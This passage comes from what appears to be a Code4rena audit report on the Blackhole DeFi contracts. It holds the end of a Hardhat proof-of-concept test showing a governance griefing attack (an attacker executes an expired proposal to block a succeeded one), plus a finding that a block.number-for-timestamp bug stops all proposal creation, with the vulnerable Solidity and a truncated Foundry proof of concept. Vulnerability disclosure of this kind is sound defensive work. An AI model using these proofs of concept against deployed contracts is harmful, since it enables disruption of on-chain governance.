class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Succeeded proposal blocked by attacker\u0026#39;s action as expected.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(await minterUpgradeable.tailEmissionRate()).to.equal(initialTailRate); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e});\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003cp\u003e\u003cstrong\u003eExpected trace:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"64\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003enpx hardhat test test/GovernorExecuteGrief.test.js\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eBlackGovernor - Griefing Attack via Flawed L2Governor.execute()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eStarting beforeEach: Deploying ALL REAL in-scope contracts...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Libraries deployed (VBL, VFL).\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Black token deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Black token initialMint called by deployer.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  PermissionsRegistry deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  GAUGE_ADMIN role granted to deployer.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  GOVERNANCE role granted to deployer.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  TokenHandler deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  VotingEscrow deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  RewardsDistributor deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  PairFactory (proxy) deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  AlgebraPoolAPIStorage (proxy) deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Gauge Factories deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eWarning: Potentially unsafe deployment of contracts/GaugeManager.sol:GaugeManager\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    You are using the `unsafeAllow.external-library-linking` flag to include external libraries.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    Make sure you have manually checked that the linked libraries are upgrade safe.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  GaugeManager (proxy) deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  VoterV3 (proxy) deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  BribeFactoryV3 (proxy) deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  MinterUpgradeable (proxy) deployed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Black token minter changed to MinterUpgradeable.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  BlackGovernor deployed and proposalNumerator set to 0.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePreparing proposer and voters...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Proposer smNFT lock created.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  smVoter1 smNFT created.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  smVoter2 smNFT created.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  End of beforeEach: Proposer smNFT Votes (current ts): 2200.0 BLACK\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  End of beforeEach: VE TotalSupply (current ts): 3300.0 BLACK\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  End of beforeEach: BlackGovernor Threshold (current ts, numerator 0): 0.0 BLACK\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAdvancing Minter to Tail Emission phase...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  MinterUpgradeable._initialize() called or already handled.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Initial Minter weekly for tail phase: 10000000.0, TAIL_START: 8969150.0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Minter internal epochCount before loop: 0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMinter in Tail Emission. Minter epochCount: 66, Weekly: 8969149.540107574558747588\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ebeforeEach setup complete.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eProposing PROP_EXPIRED...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Proposer EOA: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Block number for PROP_EXPIRED getVotes snapshot: 185\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Proposer\u0026#39;s votes for PROP_EXPIRED (using block num as ts): 0.0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Proposal Threshold for PROP_EXPIRED (using current ts): 0.0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eProposing PROP_SUCCEED...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  epochTimeHash_Expired: 0x000000000000000000000000000000000000000000000000000000006839eb18\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  epochTimeHash_Succeed: 0x000000000000000000000000000000000000000000000000000000006839ee9c\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAdvancing time for PROP_EXPIRED to expire...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROP_EXPIRED is Expired.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVoting for PROP_SUCCEED...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVotes cast for PROP_SUCCEED.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROP_SUCCEED is Succeeded.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAdvancing Minter to a new active period for nudge...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAttacker executing Expired Proposal ID: 95663595387384231139373561555078924596465919427795029072961122541929471258304 for Minter period 1748628000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eExpired proposal executed by attacker, nudge flag set for period. Tail rate unchanged.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAttempting to execute Succeeded Proposal ID: 28181572287723674322142969551870591870160588535690567740327278394187501343944 for Minter period 1748628000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eSucceeded proposal blocked by attacker\u0026#39;s action as expected.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ✔ should allow attacker to execute an Expired proposal to grief Minter.nudge() and block a Succeeded proposal (141ms)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e1 passing (3s)\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-48\"\u003erayss\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-16-getvotes-inside-the-blackgovernor-incorrectly-provides-blocknumber-instead-of-blocktimestamp-leading-to-complete-dos-of-proposal-functionality\" style=\"position:relative;\"\u003e\u003ca href=\"#m-16-getvotes-inside-the-blackgovernor-incorrectly-provides-blocknumber-instead-of-blocktimestamp-leading-to-complete-dos-of-proposal-functionality\" aria-label=\"m 16 getvotes inside the blackgovernor incorrectly provides blocknumber instead of blocktimestamp leading to complete dos of proposal functionality permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-163\"\u003e[M-16] \u003ccode\u003egetVotes\u003c/code\u003e inside the \u003ccode\u003eBlackGovernor\u003c/code\u003e incorrectly provides \u003ccode\u003eblock.number\u003c/code\u003e instead of \u003ccode\u003eblock.timestamp\u003c/code\u003e, leading to complete DOS of proposal functionality\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-406\"\u003ehakunamatata\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-71\"\u003eEgbe\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/BlackGovernor.sol#L95-L107\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/BlackGovernor.sol#L95-L107\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L268-L271\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L268-L271\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L414-L416\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L414-L416\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L746-L753\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L746-L753\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-4\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-4\" aria-label=\"finding description and impact 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eWhenever user is making a proposal inside the \u003ccode\u003eBlackGovernor\u003c/code\u003e, the contract checks whether their voting power meets the proposal threshold. However, this check is copied from the \u003ccode\u003eThenaFi\u003c/code\u003e contracts which is incorrect. I disclosed the vulnerability to the \u003ccode\u003eThenaFI\u003c/code\u003e team, however, the bug is not present in the live contracts as \u003ccode\u003eThenaFI\u003c/code\u003e team has informed me.\u003c/p\u003e\n\u003cp\u003eThe check is incorrect as it passes the \u003ccode\u003e(block.number - 1)\u003c/code\u003e to the \u003ccode\u003egetVotes\u003c/code\u003e function that expects timestamp:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"65\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_proposal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescription\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e//@audit CRITICAL getVotes expects timestamp and calls getsmNFTPastVotes that also expects timestamp\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003egetVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eproposalThreshold\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Governor: proposer votes below proposal threshold\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe can see from the code that function calls \u003ccode\u003egetVotes\u003c/code\u003e, providing block number instead of timestamp, which calls \u003ccode\u003egetsmNFTPastVotes\u003c/code\u003e that expects timestamp and will check checkpoint that is “closest” (not exactly it’s a mental shortcut) to the provided timestamp which will be \u003ccode\u003eblocknumber - 1\u003c/code\u003e in this case. \u003c/p\u003e\n\u003cp\u003eAs \u003ccode\u003eblock.number\u003c/code\u003e is way smaller than \u003ccode\u003eblock.timestamp\u003c/code\u003e the check of proposal threshold will always revert leading to DOS of proposal functionality. This is due to the fact that it will check the voting power at the timestamp that is even before the project has launched (because \u003ccode\u003eblock.number\u003c/code\u003e is way smaller than the \u003ccode\u003eblock.timestamp\u003c/code\u003e). \u003c/p\u003e\n\u003cp\u003eThis bug prevents all proposals from being created, which breaks core governance functionality. Given its impact and the fact that it can occur under normal usage without any external trigger,I believe this qualifies as a High severity issue.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eChange \u003ccode\u003eblock.number\u003c/code\u003e to \u003ccode\u003eblock.timestamp\u003c/code\u003e.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-11\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThis POC is written in foundry, in order to run it, one has to create foundry project, download dependencies, create remappings and change imports in some of the file to look inside the “src” folder\u003c/p\u003e\n\u003cp\u003eThis POC shows that even if user meets threshold proposal, due to incorrect value passed to getVotes the call reverts. If one would change the \u003ccode\u003eblock.number\u003c/code\u003e to \u003ccode\u003eblock.timestamp\u003c/code\u003e. The proposal call does not revert.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"66\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epragma\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esolidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ^\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0.8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e13\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;forge-std/Test.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/Black.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan 